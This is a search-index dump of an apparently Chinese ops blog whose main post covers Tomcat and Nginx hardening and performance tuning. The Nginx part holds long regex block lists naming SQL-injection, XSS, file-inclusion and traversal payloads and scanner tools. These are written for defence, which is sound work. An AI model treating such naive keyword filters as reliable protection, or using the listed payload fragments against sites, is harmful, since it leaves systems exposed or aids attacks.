[{"categories":["other"],"content":"又一天过去了，今天过得怎么样，梦想是不是更远了？","date":"2022-06-22","objectID":"/posts/starting/","tags":["other"],"title":"Starting","uri":"/posts/starting/"},{"categories":["other"],"content":" 第一篇文章当然是hello world了 echo \"hello world !\" ","date":"2022-06-22","objectID":"/posts/starting/:0:0","tags":["other"],"title":"Starting","uri":"/posts/starting/"},{"categories":["linux","运维记事"],"content":"常用web环境优化","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":" 前言 一篇包含tomcat、nginx、php等相关参数及性能的优化文件，看了很多，但却不能完全记住，整理一篇用于备忘。 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:0:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"1. tomcat 服务调优 tomcat: 8.5.59 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:1:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"1.1. 安全优化 降权启动 新建普通用户，切换到普通用户，启动tomcat telnet管理端口保护 修改配置文件/pathto/tomcat/conf/server.xml,22行左右的\u003cServer port=\"8005\" shutdown=\"SHUTDOWN\"\u003e 8005端口和SHUTDOWN(区分大小写)关键字,防止tomcat被远程关闭 ajp 连接端口保护 ajp 是apache和tomcat相互沟通的一个渠道，如果不使用，可以注释掉或者修改端口 /pathto/tomcat/conf/server.xml: 123 。 禁用管理端 一般管理端用于测试使用,正式使用需要删除/pathto/tomcat/webapps下所有目录,新建的站点放到该目录的ROOT下即可,另删除/pathto/tomcat/conf/tomcat-users.xml下关于角色的配置(或者删掉这个文件,似乎也没有什么影响)。 文件访问列表控制 web.xml: 121 配置listings值为false， 默认false 隐藏版本信息 可修改conf/web.xml中关于error-page的相关配置(实际上个人在5.8中好像没有找到这块的),也可以修改站点中WEB-INF/web.xml中的错误页 访问控制限制 conf/server.xml: Host 下添加\u003cValve className=\"org.apache.catalina.valves.RemoteAddrValve\" allow=\"10.0.2.*\"/\u003e 启动脚本权限修正744 应用自动部署 conf/server.xml: 158 修改参数unpackWARs和autoDeploy: \u003cHost name=\"localhost\" appBase=\"webapps\" unpackWARs=\"false\" autoDeploy=\"false\"\u003e ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:2:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"1.2. 性能优化 屏蔽dns查询 enableLookups=\"false\": 69 : /pathto/tomcat/conf/server.xml(配置默认端口那儿) jvm 调优 JAVA_OPTS=根据监控协调参数。 启用nio2(conf/server.xml) Nio2启用后zabbix带有的模板监控会出现大量的监控项无效，Object or attribute not found. 此问题暂时还未找到解决方案 \u003cConnector executor=\"tomcatThreadPool\" port=\"8080\" enableLookups=\"false\" protocol=\"org.apache.coyote.http11.Http11Nio2Protocol\" connectionTimeout=\"20000\" redirectPort=\"8443\" /\u003e ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:3:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"2. tmpfs 一种基于内存的文件系统 可用于挂载临时文件存放目录,挂载后操作目录相当于直接操作内存，umount后挂载目录数据会被直接清空。 mount -t tmpfs -o size=1024M tmpfs /mnt/usb02 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:4:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3. nginx 优化 nginx 规则匹配优先级: = \u003e 完整路径 \u003e ^~ \u003e ~|~* \u003e 部分起始路径 \u003e / 防止SQL注入、XSS攻击的实践配置方法 if ($request_method !~* GET|POST) { return 444; } #使用444错误代码可以更加减轻服务器负载压力。 if ($query_string ~* \"(\\$|'|--|[+|(%20|%2F)]union[+|(%20|%2F)]|[+|(%20|%2F)]insert[+|(%20|%2F)]|[+|(%20|%2F)]drop[+|(%20|%2F)]|[+|(%20|%2F)]truncate[+|(%20|%2F)]|[+|(%20|%2F)]update[+|(%20|%2F)]|[+|(%20|%2F)]from[+|(%20|%2F)]|[+|(%20|%2F)]grant[+|(%20|%2F)]|[+|(%20|%2F)]exec[+|(%20|%2F)]|[+|(%20|%2F)]where[+|(%20|%2F)]|[+|(%20|%2F)]select[+|(%20|%2F)]|[+|(%20|%2F)]and[+|(%20|%2F)]|[+|(%20|%2F)]or[+|(%20|%2F)]|[+|(%20|%2F)]count[+|(%20|%2F)]|[+|(%20|%2F)]exec[+|(%20|%2F)]|[+|(%20|%2F)]chr[+|(%20|%2F)]|[+|(%20|%2F)]mid[+|(%20|%2F)]|[+|(%20|%2F)]like[+|(%20|%2F)]|[+|(%20|%2F)]iframe[+|(%20|%2F)]|[\\\u003c|%3C]script[\\\u003e|%3E]|javascript|alert|webscan|dbappsecurity|style|confirm\\(|innerhtml|innertext)(.*)$\") { return 555; } if ($uri ~* \"(/~).*\") { return 501; } if ($uri ~* \"(\\\\x.)\") { return 501; } if ($query_string ~* \"[;'\u003c\u003e].*\") { return 509; } if ($request_uri ~ \" \") { return 509; } if ($request_uri ~ \"(\\/\\.+)\") { return 509; } if ($request_uri ~ \"(\\.+\\/)\") { return 509; } # sql 注入 # if ($uri ~* \"(insert|select|delete|update|count|master|truncate|declare|exec|\\*|\\')(.*)$\" ) { return 508; } if ($query_string ~ \"concat.*\\(\") { return 508; } if ($query_string ~ \"union.*select.*\\(\") { return 508; } if ($query_string ~ \"union.*all.*select.*\") { return 508; } if ($request_uri ~* \"(cost\\()|(concat\\()\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]union[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]and[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]select[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]or[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]delete[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]update[+|(%20|%2F)]\") { return 508; } if ($request_uri ~* \"[+|(%20|%2F)]insert[+|(%20|%2F)]\") { return 508; } ## 常见漏洞利用 if ($query_string ~ \"(\u003c|%3C).*script.*(\u003e|%3E)\") { return 403; } if ($query_string ~ \"GLOBALS(=|\\[|\\%[0-9A-Z]{0,2})\") { return 403; } if ($query_string ~ \"_REQUEST(=|\\[|\\%[0-9A-Z]{0,2})\") { return 403; } if ($query_string ~ \"proc/self/environ\") { return 403; } if ($query_string ~ \"mosConfig_[a-zA-Z_]{1,21}(=|\\%3D)\") { return 403; } if ($query_string ~ \"base64_(en|de)code\\(.*\\)\") { return 403; } # 垃圾邮件字段 if ($query_string ~ \"\\b(ultram|unicauca|valium|viagra|vicodin|xanax|ypxaieo)\\b\") { return 507; } if ($query_string ~ \"\\b(erections|hoodia|huronriveracres|impotence|levitra|libido)\\b\") { return 507; } if ($query_string ~ \"\\b(ambien|bluespill|cialis|cocaine|ejaculation|erectile)\\b\") { return 507; } if ($query_string ~ \"\\b(lipitor|phentermin|pro[sz]ac|sandyauer|tramadol|troyhamby)\\b\") { return 507; } ## 文件注入 if ($query_string ~ \"[a-zA-Z0-9_]=http://\") { return 444; } if ($query_string ~ \"[a-zA-Z0-9_]=(\\.\\.//?)+\") { return 444; } if ($query_string ~ \"[a-zA-Z0-9_]=/([a-z0-9_.]//?)+\") { return 444; } # if ($http_user_agent ~* \"spider\") { return 508; } #if ($http_user_agent ~ \"Wget\") { # return 508; #} # if ($http_user_agent ~* \"~17ce.com\") { return 508; } if ($http_user_agent ~* \"(YisouSpider|ApacheBench|Jmeter|JoeDog|Havij|masscan|mail2000|github|Java|python)\") { return 508; } if ($http_user_agent ~* \"WebBench*\") { return 508; } if ($http_user_agent ~* \"Nmap Scripting Engine\") { return 508; } if ($http_user_agent ~* \"Indy Library\") { return 508; } if ($http_user_agent ~ \"^$\") { return 508; } if ($http_user_agent ~ \"libwww-perl\") { return 508; } if ($http_user_agent ~ \"GetRight\") { return 508; } if ($http_user_agent ~ \"GetWeb!\") { return 508; } if ($http_user_agent ~ \"Go!Zilla\") { return 508; } if ($http_user_agent ~ \"Download Demon\") { return 508; } if ($http_user_agent ~ \"Go-Ahead-Got-It\") { return 508; } if ($http_user_agent ~ \"TurnitinBot\") { return 508; } if ($http_user_agent ~ \"GrabNet\") { return 508; } location ~* \"(\u0026pws=0|_vti_|\\(null\\)|\\{\\$itemURL\\}|echo(.*)kae|boot\\.ini|etc/pa","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:5:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.1. 版本号隐藏 修改文件: 修改nginx.conf,在http标签中添加server_tokens off;参数,然后reload 编译修改: 修改nginx源码文件/pathto/nginx-x.xx.x/src/core/nginx.h,nginx版本号参数NGINX_VERSION，软件名称 NGINX_VAR，NGINX_VER 修改nginx源码文件49: /pathto/nginx-x.xx.x/src/http/ngx_http_header_filter_module.c ,值 Server: xxxx（curl 显示的页面） 修改nginx源码文件36: /pathto/nginx-x.xx.x/src/http/ngx_http_special_response.c,值 \u003chr\u003e\u003ccenter\u003exxxx\u003c/center\u003e(错误页面:例如502) 正常编译安装 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:6:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.2. 更改nginx默认用户 修改配置文件: /pathto/nginx/conf/nginx.conf,值 user nobody 为 user \u003cuser\u003e \u003cgroup\u003e; 编译时指定默认用户: --user=\u003cuser\u003e --group=\u003cgroup\u003e ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:7:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.3. 优化wroker进程数 # main worker_processes 8; worker_cpu_affinity 0001 0010 0100 1000 0001 0010 0100 1000; # 掩码形式 分别代表1-8核 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:8:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.4. Nginx 事件模型优化 nginx是异步的网络io模型，epoll 工作模型是高性能高并发的设置。 修改配置文件: /pathto/nginx/conf/nginx.conf # main events { use epoll; # 开启的时候,将会对多个Nginx进程接受连接进行序列化,防止多个进程对连接的争抢,当服务器连接数不多时,开启这个参数会让负载有一定程度的降低. 但是当服务器的吞吐量很大时,为了效率,需要关闭. 并且关闭这个参数的时候也可以让请求在多个worker间的分配更均衡(默认关闭 off) # accept_mutex on; multi_accept on; # 告诉nginx收到一个新连接通知后接受尽可能多的连接，默认是on worker_connections 65535; # 单个worker的连接数(并发等于 worker_connections * worker_processes ) } ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:9:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.5. Nginx worker 进程最大打开文件数 main标签下设置worker_rlimit_nofile 65535 ，值可为系统优化后设置的ulimit -HSn的结果 。 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:10:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.6. Nginx 服务器域名hash表大小 : main 参数1: server_names_hash_max_size 512; 设置存放域名(server_names)的最大hash表大小(如果nginx发出消息 应首选增大 max size) 参数2: server_names_hash_bucket_size 64; 此设置与server_names_hash_max_size共同控制保存服务器域名的hash表. ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:11:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.7. 开启高效的文件传输模式 ; http/server/location/if in location sendfile on;, 作用于两个文件描述符之间的数据拷贝函数，这个拷贝操作是在内核中的。 tcp_nopush on;,允许把http response header和文件的开始放在一个文件里面发布，积极的作用是减少网络报文段的数量。 tcp_nodelay on;, 提升io性能，默认情况下数据发送时，内核并不会马上发送，可能会等待更多的字节组成一个数据包，这样可以提高I/O性能，但是，每次只发送很少字节的业务场景，使用tcp_nodelay功能，等待时间会比较长.(高并发建议使用) ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:12:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.8. 超时连接优化 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:13:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.8.1. 作用 设置将无用的连接尽快超时,可以保护服务器的系统资源(cpu、内存、磁盘) 当连接很多时，及时断掉那些已经建立好但又长时间不做事的连接, 以减少其占用的服务器资源，应为服务器维护连接也是要消耗资源的。 有时黑客或恶意用户攻击网站，就会不断的和服务器建立多个连接，消耗连接数，但啥也不干，只是持续建立连接，这就会大量消耗服务器的资源，此时就应该及时断掉这些恶意占用资源的连接。 LNMP环境中，如果用户请求了动态服务，则Nginx就会建立连接请求fastcgi服务以及mysql服务，此时这个Nginx连接就要设定一个超时时间，在用户容忍的是就按内反回数据，或者在多等一会后端服务器返回数据，具体的策略要具体业务分析。 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:13:1","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.8.2. 问题 超时时间若设置太短，并发很大的时候，就会导致服务器无法瞬间响应用户请求，导致体验下降 。 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:13:2","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.8.3. 建议 php 网站建议短连接，php程序建立连接消耗的资源和时间少 java网站建议长连接，java程序建立连接消耗的资源和时间多(连接重用，连接池..) ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:13:3","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.8.4. 配置 # http/server keepalive_timeout 60; # 默认60秒 # keepalive_time 可以使客户端到服务器端已经建立的连接一直工作而不退出，当服务器有持续请求的时候，keep-alive会使用正在建立的连接提供服务，从而避免服务器重新建立新的连接处理请求。 此参数生效需激活tcp_nodelay选项 client_header_timeout 15; # 用于设置读取客户端请求头数据的超时时间，此处的数值15单位是秒，为经验参考值。如果超过此事件客户端还没有发送完整的header数据，服务端将返回 408错误 ，指定一个时间可以防止客户端利用http协议进行攻击 。 client_body_timeout 15; # 用于设置读取客户端请求主体的超时时间，这个超时仅仅为两次成功的读取操作之间的一个超时，非请求整个主体数据的超时时间，如果在这个超时时间内，客户端没有发送任何数据，则服务端返回 408 。 send_timeout 25; # 设置服务器端传送http响应信息到客户端的超时时间(服务端发给客户端)，这个超时时间仅仅为两次成功握手后的一个超时，非请求整个响应数据的超时时间，如果这个超时时间内，客户端没有接受任何数据，连接将会被关闭。 # 上传文件大小 client_max_body_size 8m; # 上传文件大小，超过设置值反会413错误. ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:13:4","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.9. 动态参数引擎fastcgi Nginx Fastcgi参数(http) 说明 fastcgi_connect_timeout 表示Nginx服务器和后端FastCGI服务器连接的超时时间，默认60s,这个参数通常设置不要超过75s，因为建立的连接诶越多消耗的资源就越多。(Nginx请求php服务器多少时间内要拿到数据，否则断开连接502) fastcgi_send_timeout 设置Nginx允许FastCGI服务端返回数据的超时时间，即在规定时间之内后端服务器必须传完所有数据，否则Nginx将断开这个连接,默认60s(PHP需要在多少时间内将数据全部发送完成给nginx，否则断开) fastcgi_read_timeout 设置Nginx从FastCGI服务端读取响应信息的超时时间，表示连接成功建立后，Nginx等待后端服务器的响应时间，是Nginx已经进入后端的排队之中等候处理的时间。 fastcgi_buffer_size 这个是Nginx fastcgi的缓冲区大小参数，设定用来读取从fastcgi服务端收到的第一部分响应信息的缓冲区大小，这里的第一部分通常会包含一个小的响应头部，默认情况下大小是由fastcgi_buffers 指定的一个缓冲区的大小 fastcgi_buffers 设定用来读取从Fastcgi服务端收到响应信息的缓冲区大小，已经缓冲区的数量。默认值：`fastcg_buffers 8 4 fastcgi_busy_buffers_size 用于设置系统很繁忙的时候可以使用的fastcgi_buffers大小，官方推荐的大小为fastcgi_buffers *2 ，默认值 `fastcgi_busy_buffers_size 8k fastcgi_temp_file_write_size fastcgi临时文件的大小，可设置128-256k fastcgi_cache xxxx 表示开启fastcgi缓存并为其指定一个名称，开启缓存非常有用，可以有效的降低cpu负载，并且防止502错误的发生，但是开启缓存也有可能会引起其他问题，要根据具体情况来选择。 fastcgi_cache_path 例:fastcgi_cache_path /data/ngx_fcgi_cache levels=2:2 keys_zone=ngx_fcgi_cache:521min active=1d max_size=40g ,fastcgi_cache缓存目录，可以设置hash层级，比如2:2会生成256×256个子目录，keys_zone是这个缓存空间的名字，cache是用多少内存(这样热门的内容nginx直接存放内存，提高访问速度)，inactive表示默认失效的时间，max_size 表示最多用多少硬盘空间。需要注意的是fastcgi_cache缓存是先写在fastcgi_temp_path，在转移到fastcgi_cache_path，所以这两个目录最好是放在同一分区 fastcgi_cache_valid 例: fastcgi_cache_valid 200 302 1h;当状态码是200、302时候缓存一小时;fastcgi_cache_valid 301 1d; 当状态码是301时缓存一天;fastcgi_cache_valid any 1m; 当状态码是其他的时候缓存1分钟 fastcgi_cache_min_uses 设置请求几次响应被缓存 例: fastcgi_cache_min_uses 1; 表示1次请求即被缓存 fastcgi_cache_use_stale 定义那些情况下使用过期缓存 例:fastcgi_cache_use_stale error timeout invalid_header http_500; fastcgi_cache_key 例: fastcgi_cache_key $request_method://$host$request_uri; fastcgi_cache_key http://$host$request_uri; 定义fastcgi_cache的key，示例中就以请求的URI作为缓存的key，Nginx回去这个key的md5作为缓存文件，如果设置了缓存hash目录，nginx会从后向前取相应的位数作为目录。注意 一定要加上$request_method 作为cache key，否则如果HEAD类型的先请求会导致后面的GET请求返回为空。 示例配置: # fastcgi 缓冲区 和 超时时间 (http标签) fastcgi_send_timeout 240; fastcgi_read_timeout 240; fastcgi_buffer_size 64k; fastcgi_buffers 4 64k; fastcgi_busy_buffers_size 128k; fastcgi_temp_file_write_size 128k; fastcgi_temp_path /opt/nginxssl/fastcgi_temp/tmp; fastcgi_cache_path /opt/nginxssl/fastcgi_temp/cache levels=2:2 keys_zone=cache:128m inactive=1d max_size=6g; #fastcgi 缓存 (server标签) fastcgi_cache cache; fastcgi_cache_valid 200 1h; fastcgi_cache_valid 301 1d; fastcgi_cache_valid any 1m; fastcgi_cache_min_uses 1; fastcgi_cache_use_stale error timeout invalid_header http_500; fastcgi_cache_key http://$host$request_uri; ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:14:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.10. gzip ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:15:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.10.1. 优点 提升网站用户体验,提升网站用户访问速度 节约网站宽带成本 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:15:1","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.10.2. 需要和不需要压缩的对象 纯文本内容压缩比很高，因此纯文本的内容最好要压缩(例如: html、js、css、xml、shtml等) 被压缩的纯文本必须要大于1kb，否则由于压缩算法的原因，可能导致压缩反而是文件增大 图片、视频(流媒体)等文件尽量不要压缩，因为这些文件大多都是经过压缩的，如果在压缩可能不会减少太多，或者可能增大，而在压缩还会消耗大量的cpu、内存资源 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:15:2","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.10.3. 配置 参数 作用 gzip on 开启gzip压缩功能 gzip_min_length 1k 设置允许压缩页面的最小字节数，页面字节数从header头的Content-Length中获取，默认0，表示不管页面多大都进行压缩 gzip_buffers 4 16k 压缩区缓冲区大小，表示申请4个单位为16k的内存作为压缩结果流缓存，默认值是申请与原始数据大小相同的内存空间来存储gzip压缩结果 gzip_http_version 1.1 压缩版本，默认1.1，比如说前端访问的并不一定是用户，可能是cdn，这个时候就需要加一个版本，先大部分都支持gzip解压，设置默认即可 gzip_comp_level 2; 用来指定压缩比例，1 压缩最小，处理速度最快;9压缩比例最大，传输快，但处理速度慢，也比较消耗cpu资源 gzip_types text/plan application/x-javascript 指定需要压缩的文件类型 gzip_vary on; vary header 支持，该选项可以让前端的缓存服务器缓存gzip压缩的页面，(让缓存服务器继续缓存，而不是解压，只有在浏览器的时候在解压) ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:15:3","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.11. nginx expires 缓存 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:16:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.11.1. 优点 expires 可以降低网站的宽带，节约成本 加快用户访问网站的速度，提升用户体验 减少服务器访问量，降低服务器压力，节约服务器成本 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:16:1","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.11.2. 缺点 当网站被缓存的页面存在更新时，用户看到的可能还是旧的数据 解决方案: 缩短经常修改页面的缓存时间 对于经常修改的页面文件名进行添加，或加上版本号，这样前端cdn以及用户端需要重新更新缓存内容 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:16:2","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.11.3. 配置 如果配置后导致前端无法正常访问，有可能是因为server标签中没有指定root目录有关 示例: # server / http location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf){ expires 6d; } ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:16:3","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.12. nginx 日志 ","date":"2020-11-18","objectID":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/:17:0","tags":["linux","优化","nginx","php","解决方案"],"title":"常用web环境优化","uri":"/posts/linux/%E5%B8%B8%E7%94%A8web%E7%8E%AF%E5%A2%83%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"3.12.1. 切割示例 #!/bin/bash # 40 23 * * * /bin/bash /opt/sh/cut_nginx_all.sh \u003e\u003e /dev/null 2\u003e\u00261 time=`date +\"%Y-%m-%d\"` log_path=\"/opt/nginxssl/logs\" pid_path=\"/opt/nginxssl/logs/nginx.pid\" new_dir=\"/opt/logs/nginxlogs\" # nginx web 日志 (www.log) ，以空格隔开，无需后缀 logs_names=(www www1) cd $new_dir num=${#logs_names[@]} for((i=0;i\u003cnum ;i++));do mv ${log_path}/${logs_names[i]}.log ${new_dir}/${logs_names[i]}_${time}.log tar czf ${logs_names[i]}_${time}.tar.gz ${logs_names[i]}_${time}.log rm ${logs_names[i]}_${time}.log done /opt/nginxssl/sbin/nginx -s reopen 